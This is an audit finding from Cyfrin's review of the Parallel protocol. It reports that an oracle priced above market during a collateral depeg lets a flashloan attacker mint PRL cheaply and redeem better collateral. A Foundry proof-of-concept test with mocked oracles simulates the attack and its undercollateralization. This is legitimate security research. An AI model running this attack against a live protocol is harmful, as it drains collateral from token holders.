---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-03-04-cyfrin-parallel3-1-v2-0-3-0
ingested_at: '2026-07-26T07:14:09Z'
protocol_category: []
published_at: '2026-03-04T00:00:00Z'
related_swc: []
severity: Informational
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-04-cyfrin-parallel3.1-v2.0.md
tags:
- firm:cyfrin
- report:2026-03-04-cyfrin-parallel3-1-v2-0
title: Protocol susceptible to imperfect oracles with prices higher than market price
  during depeg
vuln_class: []
---

# Protocol susceptible to imperfect oracles with prices higher than market price during depeg

_Section severity (from Solodit section header): Informational_  
_Audit firm: Cyfrin_  
_Source report: [2026-03-04-cyfrin-parallel3.1-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-04-cyfrin-parallel3.1-v2.0.md)_

---

**Description:** The protocol is carefully designed to ensure solvency assuming oracles are perfect and timely. However, during a depeg of one of the collateral assets, if the market price is lower than the oracle price an attacker can make a profit. Assume that the Parallel token is backed by eurA, eurB and eurY and eurY depegs.

If the market price of eurY is lower (e.g. 0.95) than the oracle price of eurY (0.99) and a eurY-eurA pool exists an attacker can:
- flashloan an amount of eurA
- swap for eurY on a secondary eurA-eurY market at the lower price (0.95)
- mint PRL using eurY but at the (higher = 0.99) oracle price
- burn PRL for eurA collateral. Because eurY has depegged attacker only gets 0.99 eurA per PRL.
- Repay the flashloan + fees

The attacker now has a small profit in eurA.
Also, once the oracle price converges to the market value (0.95) the PRL token will be under-collateralized.

**Proof of Concept:**
```
forge test --mt test_cyfrin_FlashloanCollateralMispricingAttack_WhenOracleLagsMarket
```
- tests/units/parallel-protocolBankRunOracleLagAttack.t.sol
```solidity
// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.28;

import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import { console } from "@forge-std/console.sol";

import { MockChainlinkOracle } from "tests/mock/MockChainlinkOracle.sol";
import { Fixture } from "../Fixture.sol";
import { DecimalString } from "../utils/DecimalString.sol";
import "contracts/utils/Constants.sol";

contract CyfrinBankRunOracleLagAttackTest is Fixture {
  using DecimalString for uint256;

  uint256 internal constant MARKET_PRICE_EURA = BASE_18;
  uint256 internal constant MARKET_PRICE_EURB = BASE_18;
  uint256 internal constant MARKET_PRICE_EURY = 95e16; // 0.95
  // Assumed slippage for the external EUR_A -> EUR_Y purchase leg in basis points.
  uint256 internal constant EURA_TO_EURY_SLIPPAGE_BPS = 30; // 0.30%
  uint256 internal constant FLASHLOAN_FEE_BPS = 9; // 0.09%

  function setUp() public override {
    super.setUp();
    _setZeroFeesOnAllCollaterals();

    // Seed protocol reserves at par prices.
    _mintExactInput(governor, address(eurA), 1_000_000 * BASE_6, 0);
    _mintExactInput(guardian, address(eurB), 1_000_000 * BASE_12, 0);
    _mintExactInput(governorAndGuardian, address(eurY), 1_000_000 * BASE_18, 0);
  }

  /// @notice Demonstrates that if market EUR_Y trades below oracle EUR_Y, an attacker can
  /// flashloan EUR_A, buy discounted EUR_Y (with realistic swap slippage), mint PRL at stale oracle value,
  /// burn PRL for EUR_A, and keep a spread while worsening real collateralization.
  function test_cyfrin_FlashloanCollateralMispricingAttack_WhenOracleLagsMarket() public {
    console.log("Step 0: Start from a protocol seeded with balanced reserves and zero protocol fees.");
    console.log("Step 1: Create oracle lag: EUR_Y oracle=0.99 while market EUR_Y=0.95.");
    // Oracle still reports 0.99 while real market is 0.95.
    // No PRL market discount is needed in this setup.
    MockChainlinkOracle(address(oracleY)).setLatestAnswer(int256(99e6));

    uint256 attackerProfitEurA;
    // Repeated flashloan rounds:
    // flashloan EUR_A value -> buy discounted EUR_Y -> mint PRL at oracle value -> burn PRL for EUR_A.
    for (uint256 i; i < 3; ++i) {
      console.log(string.concat("Step 2.", _toStepString(i + 1), ": Run one flashloan arbitrage round."));
      attackerProfitEurA += _runFlashloanRound(200_000 * BASE_18);
    }
    console.log("Step 3: Compare oracle-implied collateralization vs real mark-to-market collateralization.");

    uint256 issued = tokenP.totalSupply();
    uint256 realCollateralValue = _realCollateralValue18();
    uint256 shortfall = issued > realCollateralValue ? issued - realCollateralValue : 0;

    (uint64 oracleCollatRatio,) = parallelizer.getCollateralRatio();
    uint256 oracleCollateralValue = (issued * uint256(oracleCollatRatio)) / BASE_9;
    uint256 oracleShortfall = issued > oracleCollateralValue ? issued - oracleCollateralValue : 0;

    console.log(
      string.concat(
        "Attacker cumulative profit from collateral mispricing (eurA): ",
        attackerProfitEurA.formatFixed()
      )
    );
    console.log("Oracle collateral ratio (1e9):", uint256(oracleCollatRatio));
    console.log(string.concat("Oracle-implied shortfall: ", oracleShortfall.formatFixed()));
    console.log(string.concat("Issued PRL: ", issued.formatFixed()));
    console.log(string.concat("Real collateral value marked to market: ", realCollateralValue.formatFixed()));
    console.log(string.concat("Under-collateralization shortfall: ", shortfall.formatFixed()));

    assertGt(attackerProfitEurA, 0, "Expected positive profit from oracle-vs-market collateral mismatch");
    // Oracle view underestimates stress compared to true market marking.
    assertGt(shortfall, 0, "Expected real under-collateralization after draining good collateral");
    assertGt(shortfall, oracleShortfall, "Expected real shortfall to exceed oracle-implied shortfall");
  }

  /// @notice Demonstrates an "over-heal" path: after extraction during oracle>market mismatch,
  /// if market price later recovers to 1.00, the protocol can move from shortfall to surplus.
  function test_cyfrin_OverHeal_WhenMarketRecoversToOneAfterMismatchExtraction() public {
    console.log("Step 0: Start from balanced reserves and zero protocol fees.");
    console.log("Step 1: Stress regime: EUR_Y oracle=0.99 while market EUR_Y=0.95.");
    MockChainlinkOracle(address(oracleY)).setLatestAnswer(int256(99e6));

    uint256 attackerProfitEurA;
    for (uint256 i; i < 3; ++i) {
      console.log(string.concat("Step 2.", _toStepString(i + 1), ": Execute extraction round during stress."));
      attackerProfitEurA += _runFlashloanRound(200_000 * BASE_18);
    }

    uint256 issued = tokenP.totalSupply();
    uint256 stressedValue = _realCollateralValue18AtYMarketPrice(MARKET_PRICE_EURY);
    uint256 stressedShortfall = issued > stressedValue ? issued - stressedValue : 0;
    uint256 stressedSurplus = stressedValue > issued ? stressedValue - issued : 0;
    console.log("Step 3: Mark protocol to stressed market (EUR_Y=0.95).");
    console.log(string.concat("Issued PRL: ", issued.formatFixed()));
    console.log(string.concat("Stressed real collateral value: ", stressedValue.formatFixed()));
    console.log(string.concat("Stressed shortfall: ", stressedShortfall.formatFixed()));
    console.log(string.concat("Stressed surplus: ", stressedSurplus.formatFixed()));

    uint256 recoveredYMarketPrice = BASE_18; // 1.00
    uint256 recoveredValue = _realCollateralValue18AtYMarketPrice(recoveredYMarketPrice);
    uint256 recoveredShortfall = issued > recoveredValue ? issued - recoveredValue : 0;
    uint256 recoveredSurplus = recoveredValue > issued ? recoveredValue - issued : 0;
    console.log("Step 4: Recovery regime: market and oracle converge to EUR_Y=1.00.");
    console.log(string.concat("Recovered real collateral value: ", recoveredValue.formatFixed()));
    console.log(string.concat("Recovered shortfall: ", recoveredShortfall.formatFixed()));
    console.log(string.concat("Recovered surplus (over-heal): ", recoveredSurplus.formatFixed()));
    console.log(string.concat("Attacker cumulative profit (EUR_A): ", attackerProfitEurA.formatFixed()));

    assertGt(attackerProfitEurA, 0, "Expected extraction profit during mismatch");
    assertGt(stressedShortfall, 0, "Expected shortfall while market remains below oracle");
    assertEq(recoveredShortfall, 0, "Expected shortfall to disappear after full recovery");
    assertGt(recoveredSurplus, 0, "Expected over-heal surplus after full recovery");
  }

  function _runFlashloanRound(uint256 flashPrincipalValue18) internal returns (uint256 profitEurA18) {
    console.log(
      string.concat("  - Flashloan notional EUR_A: ", flashPrincipalValue18.formatFixed())
    );
    // "Buy" cheap EUR_Y on the market with flashloaned EUR_A notional:
    // amountY = principal / (marketPrice(EUR_Y) * (1 + slippage)).
    uint256 amountY =
      (flashPrincipalValue18 * BASE_18 * 10_000) / (MARKET_PRICE_EURY * (10_000 + EURA_TO_EURY_SLIPPAGE_BPS));
    console.log(string.concat("  - Buy EUR_Y on market (with slippage), amountY: ", amountY.formatFixed()));

    // Simulate acquired EUR_Y inventory.
    deal(address(eurY), alice, amountY);

    vm.startPrank(alice);
    eurY.approve(address(parallelizer), type(uint256).max);

    uint256 minted = parallelizer.swapExactInput(
      amountY,
      0,
      address(eurY),
      address(tokenP),
      alice,
      block.timestamp + 1 hours
    );
    console.log(string.concat("  - Mint PRL using EUR_Y oracle valuation, minted: ", minted.formatFixed()));

    uint256 receivedEurA = parallelizer.swapExactInput(
      minted,
      0,
      address(tokenP),
      address(eurA),
      alice,
      block.timestamp + 1 hours
    );
    console.log(
      string.concat(
        "  - Burn PRL for EUR_A collateral, received EUR_A: ",
        _convertTokenTo18Decimals(receivedEurA, IERC20Metadata(address(eurA)).decimals()).formatFixed()
      )
    );
    vm.stopPrank();

    uint256 principalEurA6 = _convert18ToTokenDecimals(flashPrincipalValue18, IERC20Metadata(address(eurA)).decimals());
    uint256 repaymentEurA6 = principalEurA6 + (principalEurA6 * FLASHLOAN_FEE_BPS) / 10_000;
    uint256 repaymentEurA18 = _convertTokenTo18Decimals(repaymentEurA6, IERC20Metadata(address(eurA)).decimals());
    uint256 receivedEurA18 = _convertTokenTo18Decimals(receivedEurA, IERC20Metadata(address(eurA)).decimals());
    console.log(string.concat("  - Repay flashloan+fee in EUR_A: ", repaymentEurA18.formatFixed()));
    if (receivedEurA18 > repaymentEurA18) {
      console.log(string.concat("  - Round profit in EUR_A: ", (receivedEurA18 - repaymentEurA18).formatFixed()));
      return receivedEurA18 - repaymentEurA18;
    }
    console.log("  - Round profit in EUR_A: 0.000000");
    return 0;
  }

  function _toStepString(uint256 stepIndex) internal pure returns (string memory) {
    if (stepIndex == 1) return "a";
    if (stepIndex == 2) return "b";
    if (stepIndex == 3) return "c";
    return "";
  }

  function _setZeroFeesOnAllCollaterals() internal {
    uint64[] memory xMintFee = new uint64[](1);
    xMintFee[0] = uint64(0);
    uint64[] memory xBurnFee = new uint64[](1);
    xBurnFee[0] = uint64(BASE_9);
    int64[] memory yFee = new int64[](1);
    yFee[0] = 0;

    vm.startPrank(guardian);
    parallelizer.setFees(address(eurA), xMintFee, yFee, true);
    parallelizer.setFees(address(eurA), xBurnFee, yFee, false);
    parallelizer.setFees(address(eurB), xMintFee, yFee, true);
    parallelizer.setFees(address(eurB), xBurnFee, yFee, false);
    parallelizer.setFees(address(eurY), xMintFee, yFee, true);
    parallelizer.setFees(address(eurY), xBurnFee, yFee, false);
    vm.stopPrank();
  }

  function _realCollateralValue18() internal view returns (uint256) {
    return _realCollateralValue18AtYMarketPrice(MARKET_PRICE_EURY);
  }

  function _realCollateralValue18AtYMarketPrice(uint256 yMarketPrice18) internal view returns (uint256) {
    uint256 valueA = (
      _convertTokenTo18Decimals(IERC20Metadata(address(eurA)).balanceOf(address(parallelizer)), IERC20Metadata(address(eurA)).decimals())
        * MARKET_PRICE_EURA
    ) / BASE_18;
    uint256 valueB = (
      _convertTokenTo18Decimals(IERC20Metadata(address(eurB)).balanceOf(address(parallelizer)), IERC20Metadata(address(eurB)).decimals())
        * MARKET_PRICE_EURB
    ) / BASE_18;
    uint256 valueY = (
      _convertTokenTo18Decimals(IERC20Metadata(address(eurY)).balanceOf(address(parallelizer)), IERC20Metadata(address(eurY)).decimals())
        * yMarketPrice18
    ) / BASE_18;
    return valueA + valueB + valueY;
  }

  function _convertTokenTo18Decimals(uint256 amount, uint8 decimals) internal pure returns (uint256) {
    if (decimals == 18) return amount;
    if (decimals < 18) return amount * (10 ** (18 - decimals));
    return amount / (10 ** (decimals - 18));
  }

  function _convert18ToTokenDecimals(uint256 amount, uint8 decimals) internal pure returns (uint256) {
    if (decimals == 18) return amount;
    if (decimals < 18) return amount / (10 ** (18 - decimals));
    return amount * (10 ** (decimals - 18));
  }
}
```

- tests/utils/DecimalString.sol
```solidity
// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.28;

import { Strings } from "@openzeppelin/contracts/utils/Strings.sol";

/// @title DecimalString
/// @notice Utility helpers for formatting fixed-point numbers in test logs.
library DecimalString {
  /// @notice Formats a fixed-point `value` with a default `decimals` of 18.
  function formatFixed(uint256 value) internal pure returns (string memory) {
    return formatFixed(value, 18);
  }

  /// @notice Formats a fixed-point `value` into a decimal string with a period.
  /// @dev Example: `formatFixed(1234567890000000000, 18)` -> "1.2345670000000000"
  function formatFixed(uint256 value, uint8 decimals) internal pure returns (string memory) {
    uint256 base = 10 ** decimals;
    uint256 integerPart = value / base;
    uint256 fractionalPart = value % base;
    string memory integerWithCommas = _withThousandsSeparators(Strings.toString(integerPart));

    return string.concat(
      integerWithCommas,
      ".",
      _padLeftWithZeros(Strings.toString(fractionalPart), decimals)
    );
  }

  function _padLeftWithZeros(string memory value, uint8 targetLength) private pure returns (string memory) {
    bytes memory src = bytes(value);
    uint256 srcLen = src.length;
    if (srcLen >= targetLength) {
      return value;
    }
    bytes memory out = new bytes(targetLength);
    uint256 pad = uint256(targetLength) - srcLen;
    for (uint256 i; i < pad; ++i) {
      out[i] = bytes1("0");
    }
    for (uint256 i; i < srcLen; ++i) {
      out[pad + i] = src[i];
    }
    return string(out);
  }

  function _withThousandsSeparators(string memory value) private pure returns (string memory) {
    bytes memory src = bytes(value);
    uint256 srcLen = src.length;
    if (srcLen <= 3) {
      return value;
    }

    uint256 commas = (srcLen - 1) / 3;
    bytes memory out = new bytes(srcLen + commas);
    uint256 i = srcLen;
    uint256 j = out.length;
    uint256 groupCount;

    while (i > 0) {
      out[--j] = src[--i];
      groupCount++;
      if (groupCount == 3 && i > 0) {
        out[--j] = bytes1(",");
        groupCount = 0;
      }
    }
    return string(out);
  }
}
```

**Paralllel:**
Acknowledged.

**Cyfrin:** Issue has been added as an operational note on the executive summary.
